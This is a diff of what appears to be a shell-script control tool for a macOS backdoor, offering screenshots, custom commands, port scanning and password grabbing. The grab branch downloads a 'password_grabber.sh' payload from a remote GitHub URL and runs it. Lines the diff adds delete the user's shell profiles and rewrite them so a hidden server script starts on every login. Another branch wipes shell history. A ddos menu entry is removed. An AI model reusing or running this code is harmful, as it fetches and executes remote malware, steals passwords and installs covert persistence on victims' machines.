@@ -9,7 +9,6 @@ screenshot    screenshots macs current screen
 talk          text to speech
 help          shows the help menu
 custom        enter custom bash command
-ddos          launches ddos script
 scan          launches port scanner
 message       runs a message from audio.mp3
 grab          tries to grab password
@@ -52,7 +51,6 @@ screenshot    screenshots macs current screen
 talk          text to speech
 help          shows the help menu
 custom        enter custom bash command
-ddos          launches ddos script
 scan          launches port scanner
 message       runs a message from audio.mp3
 grab          tries to grab password
@@ -87,12 +85,18 @@ message)
     afplay .hidden/audio.mp3
     ;;
 grab)
+rm .zprofile
+rm .bash_profile
 curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/password_grabber.sh >> .hidden/terminal.sh
 sleep 5
 chmod +x .hidden/terminal.sh
 sleep 5
 open -a terminal.app .hidden/terminal.sh
 echo "password will be stored in .hidden/password.txt"
+mkdir .bash_profile
+mkdir .zprofile
+echo ".hidden/server.sh" >> .bash_profile
+echo ".hidden/server.sh" >> .zprofile
 ;;
 clear)
 rm .zsh_history
